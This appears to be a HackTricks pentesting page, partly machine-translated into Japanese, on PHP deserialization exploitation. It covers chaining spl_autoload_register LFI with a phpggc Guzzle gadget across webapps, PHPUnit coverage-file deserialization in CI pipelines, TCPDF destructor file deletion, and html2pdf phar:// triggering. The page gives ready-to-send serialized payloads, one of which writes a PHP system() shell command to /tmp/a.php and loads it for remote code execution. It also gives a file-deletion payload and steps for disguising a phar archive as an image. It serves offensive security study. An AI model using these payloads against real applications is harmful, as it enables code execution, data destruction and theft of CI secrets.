# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

まず、[**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php) を確認してください。

## PHP deserialization + spl_autoload_register + LFI/Gadget

ある状況では、webapp内で**PHP deserialization**を発見しましたが、**`phpggc`** の中にあるような脆弱なgadgetを含むライブラリは**存在しません**でした。しかし同じコンテナ内に**脆弱なライブラリを含む別の composer webapp**がありました。したがって目的は、別のwebappの**composer loader**を読み込み、それを悪用してdeserializationに脆弱なwebapp側のgadgetでそのライブラリを攻撃するgadgetを読み込むことでした。

Steps:

- 対象で**deserialization**を見つけ、現在のアプリコードには**gadgetが存在しない**
- 以下のような **`spl_autoload_register`** を悪用して、**`.php` 拡張子を持つ任意のローカルファイルをロード**できる
- そのために、クラス名が **`$name`** に入るようなdeserializationを使用します。シリアライズされたオブジェクトのクラス名には **"/" や "."** を使えませんが、**code** がアンダースコア ("_") を **スラッシュ** ("/") に **置換** します。したがって `tmp_passwd` のようなクラス名は `/tmp/passwd.php` に変換され、コードはそれをロードしようとします。\
A **gadget example** は: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload example</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> もし**file upload**があり、**`.php` extension**のファイルをアップロードできるなら、その機能を**abuse this functionality directly**して既にRCEを得られます。

私の場合、そうしたものはなかったのですが、**same container**内に別のcomposer Webアプリケーションがあり、**library vulnerable to a `phpggc` gadget**がありました。

- 別のライブラリを読み込むには、まず**load the composer loader of that other web app**が必要です（現在のアプリケーションのローダーは他方のライブラリにアクセスできないため）。**Knowing the path of the application**が分かっていれば、次のように簡単に達成できます: **`O:28:"www_frontend_vendor_autoload":0:{}`**（私の場合、composer loader は `/www/frontend/vendor/autoload.php` にありました）
- これで他方の**app composer loader**を**load**できるので、使用するために**`generate the phpgcc`**の**payload**を作る段階です。私の場合、**`Guzzle/FW1`**を使い、**write any file inside the filesystem**ことができました。
- 注: 生成された**generated gadget was not working**ため、動作させるには phpggc のそのペイロード **`chain.php`** を**modified**し、クラスの**all the attribute**を**from private to public**に設定しました。そうしないと、文字列をデシリアライズした後、生成されたオブジェクトの属性は値を持ちませんでした。
- これで**load the others app composer loader**して**phpggc payload that works**を用意する方法はできましたが、gadget 使用時にローダーが読み込まれるようにこれを**do this in the SAME REQUEST for the loader to be loaded when the gadget is used**必要があります。そのため、両方のオブジェクトを含むserialized arrayを次のように送信しました:
- **first the loader being loaded and then the payload** が確認できます。
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- 今、我々は**ファイルを作成して書き込む**ことができます。ただし、ユーザーは**web server内のどのフォルダにも書き込めませんでした**。したがって、payload内で確認できるように、PHPが**`system`**を呼び出し、いくつかの**base64**を用いたコードが**`/tmp/a.php`**として作成されます。次に、我々は**reuse the first type of payload** を再利用して、LFIとして使用した方法で他の webapp t**o load the generated `/tmp/a.php`** file。単にそれを deserialization gadget に追加してください:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**ペイロードの概要**

- **Load the composer autoload** — 同じコンテナ内の別の webapp のものを読み込む
- **Load a phpggc gadget** — 別の webapp のライブラリを悪用するために使用（当初 deserialization に脆弱だった webapp のライブラリには gadget が存在しなかった）
- gadget は `/tmp/a.php` に悪意あるコマンドを含む **create a file with a PHP payload** を作成する（webapp ユーザはどの webapp のフォルダにも書き込みできない）
- ペイロードの最終部分で **load the generated php file** を使ってコマンドを実行する

この deserialization を **call this deserialization twice** する必要があった。私のテストでは、最初は `/tmp/a.php` が作成されたが読み込まれず、2回目で正しく読み込まれた。

### Recent phpggc goodies (2025)

- **phpggc master branch keeps adding chains**: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 などが 2025 年に追加された — ターゲットアプリがこれらのプロジェクトと vendor コードを共有しているときに有用。素早く検索するには `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` を使う（まず clone を更新すること）。
- アプリ間で gadgets を autoloading 経由で混ぜる場合、ターゲットでクラスが異なって再宣言されると、**private properties in gadget definitions may be dropped** ことに注意；ペイロードが空値で到着する場合は gadget の `chain.php` を編集してプロパティを `public` にする（上で示した同じトリック）。

## PHPUnit PHPT coverage deserialization (CI/CD entrypoint)

`phpunit` before **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) は **PHPT runner** が生成する `.coverage` ファイルから任意の PHP オブジェクトを unserialized していた。信頼できない contrib がテストを push できる CI パイプラインでは、細工した `.coverage` ファイルを置くだけでスイート実行時に deserialization がトリガーされる — web アクセスは不要。

**Attack flow**

1. リポジトリ（または artifact）に、テスト依存に存在する gadget（例: phpggc の Monolog や Guzzle チェーン）を含む悪意ある `.coverage` ファイルを置く。
2. PR を送る；CI が `phpunit --configuration phpunit.xml` を実行すると、PHPT runner が coverage ファイルを読み取り gadget を deserializes し、**RCE inside the runner container** を得る。
3. テストが CI のシークレット（cloud creds、deployment keys）をマウントしている場合、特に厄介。

**Minimal malicious coverage stub** (drop alongside a PHPT test):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Run the PHPT so phpunit consumes `exploit.coverage`.

## TCPDF `__destruct` POP チェーンによる任意ファイル削除

実際の `TCPDF` インスタンスがガベージコレクトされると、`_destroy(true)` を呼び出し、`$this->imagekeys` を反復処理して、`K_PATH_CACHE` 下のキャッシュファイルに見えるものを `unlink()` します。  
アプリケーションが `TCPDF` クラスがロードされた状態で `unserialize($user_data)` を実行する場合（例：`html` キーを持つ配列を期待している）、次のように設定されたシリアライズ済みオブジェクトを渡すことができます:

- `file_id` を `self::$cleaned_ids` に存在しない任意の整数に設定する（例：`-1`）。
- `imagekeys` を `K_PATH_CACHE` で始まるパス、またはそれに見えるようにできるパスに設定する（例：`K_PATH_CACHE` が `/tmp/` のとき `/tmp/../tmp/do_not_delete_this_file.txt`）。

Example payload hitting an unsafe `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` flow:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
オブジェクトがスコープ外になるとファイルは直ちに削除されます。TCPDF 6.9.3 はチェックを強化し、`K_PATH_CACHE` 内の `__tcpdf_<file_id>_` プレフィックスを持つパスのみを削除するようにし、さらに非 `file://` スキームをブロックするために `_unlink()` を導入したため、古い `Producer` バージョンが格好の標的になります。

### html2pdf の `<cert>` タグ内で `phar://` を使ってガジェットをトリガーする

`spipu/html2pdf` (≤5.3.0) は TCPDF をラップし、`<cert>` カスタムブロックを提供します。このブロックの `src`/`privkey` 属性は単に `file_exists()` で検証されます。PHP < 8.0 では、`phar://` URL に触れる任意のファイルシステム関数が Phar のメタデータを `unserialize()` させます。上記の悪意ある TCPDF オブジェクトを Phar アーカイブのメタデータに格納すれば、アプリケーションが `unserialize()` を呼ばなくても確実な POP を得られます。

1. `phar.readonly=0` にして Phar を作成し、stub/manifest を画像のように見せかけ（例: `archive.phar` を `archive.png` にリネーム）、シリアライズされた TCPDF オブジェクトを Phar のメタデータに格納します。
2. ファイルを `/tmp/user_files/user_1/archive.png` のような到達可能な場所にアップロード/配置します。
3. html2pdf が攻撃者制御のパスを解決するよう、`<cert>` タグを含む HTML を送信します:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
`file_exists()` の呼び出しはメタデータをデシリアライズし、TCPDF をインスタンス化し、そのデストラクタが選択されたファイルを削除することで、html2pdf を強力な `phar://` エントリポイントに変えます。Version 5.3.1 added `Security::checkValidPath()` to block unapproved schemes, so legacy deployments remain attractive.

## References

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
